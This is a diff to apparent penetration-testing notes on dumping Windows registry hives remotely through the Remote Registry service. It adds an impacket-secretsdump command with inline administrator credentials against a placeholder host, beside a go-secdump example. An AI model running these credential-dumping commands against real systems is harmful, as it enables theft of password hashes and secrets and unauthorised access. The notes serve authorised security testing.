@@ -34,6 +34,13 @@ Connect to the *Remote Registry* service, read the boot key from the `SYSTEM` hi
 
 Connect to *Remote Registry* and dump the registry hives without touching disk by temporally relaxing ACLs.
 
+=== "[[notes/tools/impacket]]"
+    Requires [PR 1698](https://github.com/fortra/impacket/pull/1698).
+
+    ~~~ bash
+    impacket-secretsdump -history -inline administrator:'passw0rd'@srv01.corp.local
+    ~~~
+
 === "[[notes/tools/go-secdump]]"
     ~~~ bash
     go-secdump -host srv01.corp.local -local -user administrator -pass 'passw0rd'
